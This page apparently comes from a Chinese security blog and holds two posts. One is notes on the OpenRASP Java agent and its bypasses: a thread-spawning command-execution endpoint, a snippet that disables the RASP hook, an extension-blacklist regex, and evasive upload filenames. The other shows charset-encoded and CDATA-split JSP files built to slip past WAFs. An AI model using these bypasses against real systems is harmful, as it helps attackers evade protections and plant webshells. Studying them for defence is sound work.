class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>transform:155, CustomClassTransformer (com.baidu.openrasp.transformer)</code>：CustomClassTransformer 实现了ClassFileTransformer接口，在transorm方法中，通过遍历<code>hooks</code>获取所有价值的Hook类，并通过Hook类的<code>isClassMatched</code>方法判断当前类是否Hook类的关注类，如果是，之后的具体操作则交由Hook类的<code>tranformClass</code>方法</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CustomClassTransformer_transform.png" alt></p>
-<p><code>retransform:93, CustomClassTransformer (com.baidu.openrasp.transformer)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CustomClassTransformer_retransform.png" alt></p>
-<h4 id="1-2-2-5-2-1-Javassit实现hook"><a href="#1-2-2-5-2-1-Javassit实现hook" class="headerlink" title="1-2-2-5-2-1 Javassit实现hook"></a>1-2-2-5-2-1 Javassit实现hook</h4><p><code>hookMethod</code>中先通过``getInvokeStaticSrc<code>方法获取“桩”的JAVA代码，再调用</code>insertBefore`方法进行“插”的操作（使用Javassist），如插入在构造方法前，被hook的类在实例化前会调用该插入的方法。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">hookMethod:69, FileOutputStreamHook (com.baidu.openrasp.hook.file)</span><br><span class="line">transformClass:83, AbstractClassHook (com.baidu.openrasp.hook)</span><br><span class="line">transform:155, CustomClassTransformer (com.baidu.openrasp.transformer)</span><br><span class="line">transform:188, TransformerManager (sun.instrument)</span><br><span class="line">transform:428, InstrumentationImpl (sun.instrument)</span><br><span class="line">retransformClasses0:-1, InstrumentationImpl (sun.instrument)</span><br><span class="line">retransformClasses:144, InstrumentationImpl (sun.instrument)</span><br><span class="line">retransform:93, CustomClassTransformer (com.baidu.openrasp.transformer)</span><br><span class="line">initTransformer:135, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:74, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>hookMethod:69, FileOutputStreamHook (com.baidu.openrasp.hook.file)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/FileOutoutStreamHook_hookMethod.png" alt></p>
-<p><code>transformClass:83, AbstractClassHook (com.baidu.openrasp.hook)</code>：调用在子类中重写的hookMethod</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/AbstractClassHook_transformClass.png" alt></p>
-<h3 id="1-2-2-6-云管理初始化"><a href="#1-2-2-6-云管理初始化" class="headerlink" title="1-2-2-6 云管理初始化"></a>1-2-2-6 云管理初始化</h3><p>如果配置了集中管理，这里会进行一个云管理的配置加载，好像还涉及到<code>IAST</code>技术，本文忽略。</p>
-<p><code>start:75, EngineBoot (com.baidu.openrasp)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/EngineBoot_start_Cloud.png" alt></p>
-<h3 id="2-请求处理"><a href="#2-请求处理" class="headerlink" title="2 请求处理"></a>2 请求处理</h3><p>这里以官方的文件上传为例，简要概述。</p>
-<p>文件上传的后缀名检测流程前会触发ApplicationFilterHook，但是这里最后调用的检测器是<code>request</code>，未看到该检测器的逻辑实现，应该是未起作用的，这里就不关注了。</p>
-<p>后面流程中，先触发FileUploadHook插桩于FileUploadBase的parseRequest方法前的cacheFileUploadParam方法，这里对当前HTTP请求做了解析并保存到HookHandler，不过这里的requestCache只有获取请求ID的作用，并没有用作检测判断的数据。</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/FileUploadHook_cacheFileUploadParam.png" alt></p>
-<p>之后触发HookHandler 的doRealCheckWithoutRequest，这里调用CheckManger.check进行文件后缀检测，底层走到了JS引擎。</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/doRealCheckWithoutRequest_doRealCheckWithoutRequest.png" alt></p>
-<p>handleBlock用于加载自定义的HTTP响应页面，提示用户当前请求被识别为恶意请求，并向上抛安全异常，记录本次攻击事件。</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/HookHandler_handleBlock.png" alt></p>
-<p>JS中通过<code>pulgin.register</code>注册回调函数，而JAVA代码中通过调用native方法来调用该注册函数，获取是否判黑的结果。下面是文件上传部分JS代码，获取到的文件名后通过正则判断文件名是否非法，返回的JSON数据中指明action、message等消息即可：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> plugin  = <span class="keyword">new</span> RASP(plugin_name)</span><br><span class="line"><span class="keyword">var</span> algorithmConfig = &#123;</span><br><span class="line">...</span><br><span class="line">    <span class="comment">// 写文件操作 - NTFS 流</span></span><br><span class="line">    writeFile_NTFS: &#123;</span><br><span class="line">        name:   <span class="string">'算法1 - 拦截 NTFS ::$DATA 写入操作'</span>,</span><br><span class="line">        action: <span class="string">'block'</span></span><br><span class="line">    &#125;,</span><br><span class="line">        writeFile_script: &#123;</span><br><span class="line">        name:      <span class="string">'算法2 - 拦截 php/jsp 等脚本文件的写入操作'</span>,</span><br><span class="line">        reference: <span class="string">'https://rasp.baidu.com/doc/dev/official.html#case-file-write'</span>,</span><br><span class="line">        action:    <span class="string">'block'</span>,</span><br><span class="line">        userinput:  <span class="literal">true</span>,</span><br><span class="line">        lcs_search: <span class="literal">false</span></span><br><span class="line">    &#125;,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment">// 配置挂载到全局 RASP 变量</span></span><br><span class="line">RASP.algorithmConfig = algorithmConfig</span><br><span class="line"><span class="keyword">const</span> clean = &#123;</span><br><span class="line">    action:     <span class="string">'ignore'</span>,</span><br><span class="line">    message:    <span class="string">'Looks fine to me'</span>,</span><br><span class="line">    confidence: <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">var</span> scriptFileRegex = <span class="regexp">/\.(aspx?|jspx?|php[345]?|phtml|sh|py|pl|rb)\.?$/i</span></span><br><span class="line"><span class="keyword">var</span> ntfsRegex       = <span class="regexp">/::\$(DATA|INDEX)$/</span></span><br><span class="line">...</span><br><span class="line">plugin.register(<span class="string">'writeFile'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">params, context</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 写 NTFS 流文件，通常是为了绕过限制</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.writeFile_NTFS.action != <span class="string">'ignore'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ntfsRegex.test(params.realpath))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                action:     algorithmConfig.writeFile_NTFS.action,</span><br><span class="line">                message:    _(<span class="string">"File write - Writing NTFS alternative data streams"</span>, [params.realpath]),</span><br><span class="line">                confidence: <span class="number">95</span>,</span><br><span class="line">                algorithm:  <span class="string">'writeFile_NTFS'</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> clean</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<h1 id="5-绕过分析"><a href="#5-绕过分析" class="headerlink" title="5.绕过分析"></a>5.绕过分析</h1><h3 id="5-1-已知手法"><a href="#5-1-已知手法" class="headerlink" title="5.1 已知手法"></a>5.1 已知手法</h3><p><a href="https://www.anquanke.com/post/id/195016" target="_blank" rel="noopener">多种姿势openrasp命令执行绕过</a>一文中，作者给出了两种命令执行的绕过手法</p>
-<p>①创建新线程，在新线程中进行命令执行，比如在spring中使用如下代码进行命令执行</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"testCmd.do"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testCmd</span><span class="params">(<span class="keyword">final</span> String cmd)</span></span>&#123;</span><br><span class="line">    Thread t = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable()&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;&#125;);</span><br><span class="line">    t.start();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"testCmd"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>②通过全局的Hook开关关闭rasp，如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;com.baidu.openrasp.HookHandler&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    HookHandler.enableHook.getAndSet(false);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>笔者的看法是，OpenRASP的目标应该是漏洞防护，漏洞防护也不能影响业务。如果存在业务的命令执行漏洞如①场景一致，那么应该确实是问题。另外被入侵成功后如何防护，对于该项目可能不是当前重点甚至意义不大。OpenRASP有后台管理（集中），不过目前看不到各主机的hook开关情况。</p>
-<h3 id="5-2-Hook点"><a href="#5-2-Hook点" class="headerlink" title="5.2 Hook点"></a>5.2 Hook点</h3><p>RASP核心是hook并插桩，如果有漏洞的类未被hook到或是hook的类非底层关键类，则该技术会被绕过。如在命令执行中，对于JAVA版本&lt;JDK8的，代码hook了<code>java.lang.ProcessImpl</code>与<code>java.lang.UNIXProcess</code>。此处只是一提，笔者对于这块没有发现绕过点。</p>
-<p><code>isClassMatched:65, ProcessBuilderHook (com.baidu.openrasp.hook.system)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ProcessBuilderHook_isClassMatched.png" alt></p>
-<h3 id="5-3-规则缺陷"><a href="#5-3-规则缺陷" class="headerlink" title="5.3 规则缺陷"></a>5.3 规则缺陷</h3><p>OpenRASP还是不免用到了一些规则，如果规则未黑名单形式，比较难避免遗漏。如针对文件上传有文件后缀过滤正则，其中针对脚本文件的黑名单正则：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var scriptFileRegex &#x3D; &#x2F;\.(aspx?|jspx?|php[345]?|phtml|sh|py|pl|rb)\.?$&#x2F;i</span><br></pre></td></tr></table></figure>
-
-<p>使用官方的vulns.war中的<code>008 - 任意文件上传漏洞 - commons.io 方式</code>进行漏洞测试，在windows下上传文件名“test.jsp…”可成功上传。另外可以通过“../test.war”的方式成功上传war包到webapp目录下，但由于该漏洞案例写文件的Writer为字符流而非二进制流，所以上传后的war不能成功执行。</p>
-<h1 id="6-其他说明"><a href="#6-其他说明" class="headerlink" title="6.其他说明"></a>6.其他说明</h1><p>代码中<code>OpenRasp</code>使用的JS引擎还是V8，不符合官方文档所说的<code>Rhnio</code>引擎，后来在官方QQ群中，群主<code>c0de::bre@k</code>回应到：“是j2v8太慢，优化过的v8比rhino快很多，js兼容性也强”。</p>
-<h1 id="7-结语"><a href="#7-结语" class="headerlink" title="7.结语"></a>7.结语</h1><p>通篇学习下来，笔者认为，对于普通人来说，实践与维护RASP的难度对比传统WAF来说，省去了大量请求解析与解码的工作，且安全效果会比较显著，毕竟其深入嵌入产品代码。但方案比较狭隘，不同用户可能会有自己的hook需求与安全功能需求，另外语言的变化还会付出额外维护成本。而OpenRASP已经比较成熟，除了攻击检测外还支持安全基线检测、类库信息收集等功能，其JS插件也简单易上手（除了需要吐槽整坨代码写一个文件），还具备后台管理功能与IAST功能，令笔者意想不到的强大。</p>
-<p>另外打下广告，本人目前求职中，求职意向为web安全岗，一线城市皆可…</p>
-<p> 相关参考</p>
-<p><a href="https://rasp.baidu.com/doc/" target="_blank" rel="noopener">https://rasp.baidu.com/doc/</a> OpenRASP官方文档</p>
-<p><a href="https://docs.oracle.com/javase/8/docs/platform/jvmti/jvmti.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/platform/jvmti/jvmti.html</a> JVMTM Tool Interface</p>
-<p><a href="https://xz.aliyun.com/t/4290" target="_blank" rel="noopener">https://xz.aliyun.com/t/4290</a>  浅谈RASP技术攻防之基础篇  </p>
-<p><a href="https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html" target="_blank" rel="noopener">https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html</a> 字节码增强技术探索</p>
-<p><a href="https://www.anquanke.com/post/id/187415" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187415</a> 浅谈RASP</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-WAF_Bypass之wesbhell上传-jsp与tomcat" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/">WAF_Bypass之wesbhell上传-jsp与tomcat</a>
-    </h1>
-  
-
-        
-        <a href="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/" class="archive-article-date">
-  	<time datetime="2020-07-09T09:46:51.516Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="1-开个头"><a href="#1-开个头" class="headerlink" title="1.开个头"></a>1.开个头</h1><p>事情是这样的，某一天，笔者闲着无聊，对着Tomcat的示例文件到处点点，希望寻找出点什么，意外发现Tomcat的示例文件中一些有趣的示例：</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/tomcat_jsp_xml_example.png" alt></p>
-<p>随后笔者翻开Tomcat的解析代码，对其进行了一番静态代码审阅，果然有蹊跷，后面又调试看了看。</p>
-<h1 id="2-代码要点简析"><a href="#2-代码要点简析" class="headerlink" title="2 代码要点简析"></a>2 代码要点简析</h1><p>对于脚本jsp文件，会通过EncodingDetector进行字符集类型的探测，该处代码要点较多，也是主逻辑，所以整片代码放上来了。</p>
-<p>apache-tomcat-9.0.35/lib/jasper.jar!/org/apache/jasper/compiler/ParserController.class：determineSyntaxAndEncoding</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/determineSyntaxAndEncoding2.png" alt></p>
-<p>编码探测过程在该类初始化方法中进行，首先会使用processBom方法，根据文件的前4个字节探测字符集类型，这里的代码和xerces的Magic Charset中的字符集类型探测代码有着异曲同工之妙…；之后会使用getPrologEncoding方法尝试获取文件的declare charset，declare charset优先级高于magic charset。</p>
-<p>apache-tomcat-9.0.35/lib/jasper.jar!/org/apache/jasper/compiler/EncodingDetector.class</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/EncodingDetector.png" alt></p>
-<p>processBom方法会调用parseBom方法根据文件头4个字节返回字符集类型：</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/processBom.png" alt></p>
-<p>getPrologEncoding将文件流传入xml解析，底层还是用的xerces，如果编码类型为xerces不支持的，这里会暂时忽略掉异常。</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/getPrologEncoding.png" alt></p>
-<p>但并非processBom或getPrologEncoding得到的字符集就能被成功，后续创建字符流读取器会检查自身是否支持这些字符集。</p>
-<p>这一步中也会做字符集别名的映射查找，一番操作过后，如果该字符集未读取器不支持的，最后会抛出异常。如UTF-32BE字符集，在getPrologEncoding方法中会抛出异常（不支持），在processBom中虽然不会抛出异常，但是其过程中得到的字符集名称为ISO-10646-UCS-4。而在InputStreamReader中不支持该字符集，也无别名映射（想想也是，ISO-10646-UCS-4这个名字根本也无法判断大端小端，而且代码流程中也没有传递大小端这一变量）。</p>
-<p>jdk1.8.0_191/src.zip!/java/nio/charset/Charset.java</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/flowToCharsetLoolup.png" alt></p>
-<p>ParserController.class：determineSyntaxAndEncoding方法中，如果文件没有带BOM，会触发getPageEncodingForJspSyntax函数流程</p>
-<p>apache-tomcat-9.0.30-src/java/org/apache/jasper/compiler/ParserController.java，getPageEncodingForJspSyntax</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/getPageEncodingForJspSyntax.png" alt></p>
-<p>从代码来看，指令标签有好几种：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:directive.page  &#x2F;&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page  %&gt;</span><br></pre></td></tr></table></figure>
-
-<p>声明字符编码的方式至少有两种：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pageEncoding&#x3D;&quot;UTF-16be&quot;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contentType&#x3D;&quot;charset&#x3D;utf-16be&quot;</span><br></pre></td></tr></table></figure>
-
-<h1 id="2-实战讲解"><a href="#2-实战讲解" class="headerlink" title="2 实战讲解"></a>2 实战讲解</h1><h2 id="2-1-charset"><a href="#2-1-charset" class="headerlink" title="2.1 charset"></a>2.1 charset</h2><p>通过阅读代码流程，我们可以得到如下表格，该表格用于Magic Charset方法，而XML的Declare Charset也可以使用，笔者在这里就不再描述了，参考笔者的关于xerces解析的文章即可 <a href="https://www.anquanke.com/post/id/209826" target="_blank" rel="noopener">WAF Bypass之xerces解析</a>。</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/magic_charset.png" alt></p>
-<p>有如下原始JSP文件，jsp_xml.jsp:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;jsp:root xmlns:jsp&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;JSP&#x2F;Page&quot;</span><br><span class="line">  version&#x3D;&quot;1.2&quot;&gt;</span><br><span class="line">&lt;jsp:directive.page contentType&#x3D;&quot;text&#x2F;html&quot;&#x2F;&gt;</span><br><span class="line">&lt;jsp:declaration&gt;</span><br><span class="line">&lt;&#x2F;jsp:declaration&gt;</span><br><span class="line">&lt;jsp:scriptlet&gt;</span><br><span class="line">out.write(&quot;I&#39;m turn1tup!&quot;);</span><br><span class="line">&lt;&#x2F;jsp:scriptlet&gt;</span><br><span class="line">&lt;jsp:text&gt;</span><br><span class="line">&lt;&#x2F;jsp:text&gt;</span><br><span class="line">&lt;&#x2F;jsp:root&gt;</span><br></pre></td></tr></table></figure>
-
-<p>使用UTF-16BE字符集进行编码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00%3C%00%3F%00x%00m%00l%00%20%00v%00e%00r%00s%00i%00o%00n%00%3D%00%22%001%00.%000%00%22%00%20%00e%00n%00c%00o%00d%00i%00n%00g%00%3D%00%22%00U%00T%00F%00-%001%006%00b%00e%00%22%00%3F%00%3E%00%0A%00%3C%00j%00s%00p%00%3A%00r%00o%00o%00t%00%20%00x%00m%00l%00n%00s%00%3A%00j%00s%00p%00%3D%00%22%00h%00t%00t%00p%00%3A%00&#x2F;%00&#x2F;%00j%00a%00v%00a%00.%00s%00u%00n%00.%00c%00o%00m%00&#x2F;%00J%00S%00P%00&#x2F;%00P%00a%00g%00e%00%22%00%0A%00%20%00%20%00v%00e%00r%00s%00i%00o%00n%00%3D%00%22%001%00.%002%00%22%00%3E%00%0A%00%3C%00j%00s%00p%00%3A%00d%00i%00r%00e%00c%00t%00i%00v%00e%00.%00p%00a%00g%00e%00%20%00c%00o%00n%00t%00e%00n%00t%00T%00y%00p%00e%00%3D%00%22%00t%00e%00x%00t%00&#x2F;%00h%00t%00m%00l%00%22%00&#x2F;%00%3E%00%0A%00%3C%00j%00s%00p%00%3A%00d%00e%00c%00l%00a%00r%00a%00t%00i%00o%00n%00%3E%00%0A%00%3C%00&#x2F;%00j%00s%00p%00%3A%00d%00e%00c%00l%00a%00r%00a%00t%00i%00o%00n%00%3E%00%0A%00%3C%00j%00s%00p%00%3A%00s%00c%00r%00i%00p%00t%00l%00e%00t%00%3E%00%0A%00o%00u%00t%00.%00w%00r%00i%00t%00e%00%28%00%22%00I%00%27%00m%00%20%00t%00u%00r%00n%001%00t%00u%00p%00%21%00%22%00%29%00%3B%00%0A%00%3C%00&#x2F;%00j%00s%00p%00%3A%00s%00c%00r%00i%00p%00t%00l%00e%00t%00%3E%00%0A%00%3C%00j%00s%00p%00%3A%00t%00e%00x%00t%00%3E%00%0A%00%3C%00&#x2F;%00j%00s%00p%00%3A%00t%00e%00x%00t%00%3E%00%0A%00%3C%00&#x2F;%00j%00s%00p%00%3A%00r%00o%00o%00t%00%3E%00%0A</span><br></pre></td></tr></table></figure>
-
-<p>使用CP037进行编码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lo%A7%94%93%40%A5%85%99%A2%89%96%95%7E%7F%F1K%F0%7F%40%85%95%83%96%84%89%95%87%7E%7F%83%97%F0%F3%F7%7Fon%25L%91%A2%97z%99%96%96%A3%40%A7%94%93%95%A2z%91%A2%97%7E%7F%88%A3%A3%97zaa%91%81%A5%81K%A2%A4%95K%83%96%94a%D1%E2%D7a%D7%81%87%85%7F%25%40%40%A5%85%99%A2%89%96%95%7E%7F%F1K%F2%7Fn%25L%91%A2%97z%84%89%99%85%83%A3%89%A5%85K%97%81%87%85%40%83%96%95%A3%85%95%A3%E3%A8%97%85%7E%7F%A3%85%A7%A3a%88%A3%94%93%7Fan%25L%91%A2%97z%84%85%83%93%81%99%81%A3%89%96%95n%25La%91%A2%97z%84%85%83%93%81%99%81%A3%89%96%95n%25L%91%A2%97z%A2%83%99%89%97%A3%93%85%A3n%25%96%A4%A3K%A6%99%89%A3%85M%7F%C9%7D%94%40%A3%A4%99%95%F1%A3%A4%97Z%7F%5D%5E%25La%91%A2%97z%A2%83%99%89%97%A3%93%85%A3n%25L%91%A2%97z%A3%85%A7%A3n%25La%91%A2%97z%A3%85%A7%A3n%25La%91%A2%97z%99%96%96%A3n%25</span><br></pre></td></tr></table></figure>
-
-<p>编码方式可参考 <a href="https://github.com/turn1tup/scripts/blob/master/charset_test.py" target="_blank" rel="noopener">https://github.com/turn1tup/scripts/blob/master/charset_test.py</a> ：</p>
-<p><img src="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/charset_test_py.png" alt></p>
-<p>对于以下代码，我们也可以对其进行编码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% out.write(&quot;I&#x2F;&#39;m turn1tup!&quot;);  %&gt;</span><br></pre></td></tr></table></figure>
-
-<p>使用UTF-16BE编码，需带BOM标识：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%FE%FF%00%3C%00%25%00%20%00o%00u%00t%00.%00w%00r%00i%00t%00e%00%28%00%22%00I%00%27%00m%00%20%00t%00u%00r%00n%001%00t%00u%00p%00%21%00%22%00%29%00%3B%00%20%00%25%00%3E</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-2-XML特性"><a href="#2-2-XML特性" class="headerlink" title="2.2 XML特性"></a>2.2 XML特性</h2><p>参考文章 <a href="https://www.anquanke.com/post/id/209826" target="_blank" rel="noopener">WAF Bypass之xerces解析</a>，这里举一些例子：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;jsp:root xmlns:jsp=<span class="string">"http://java.sun.com/JSP/Page"</span></span><br><span class="line">  version=<span class="string">"1.2"</span>&gt;</span><br><span class="line">&lt;jsp:directive.page contentType=<span class="string">"text/html"</span>/&gt;</span><br><span class="line">&lt;jsp:declaration&gt;</span><br><span class="line">&lt;/jsp:declaration&gt;</span><br><span class="line">&lt;jsp:scriptlet&gt;</span><br><span class="line">&lt;![CDATA[o]]&gt;u&lt;![CDATA[t.writ]]&gt;&lt;![CDATA[e]]&gt;(<span class="string">"I'm turn1tup!"</span>);</span><br><span class="line">&lt;/jsp:scriptlet&gt;</span><br><span class="line">&lt;jsp:text&gt;</span><br><span class="line">&lt;/jsp:text&gt;</span><br><span class="line">&lt;/jsp:root&gt;</span><br></pre></td></tr></table></figure>
-
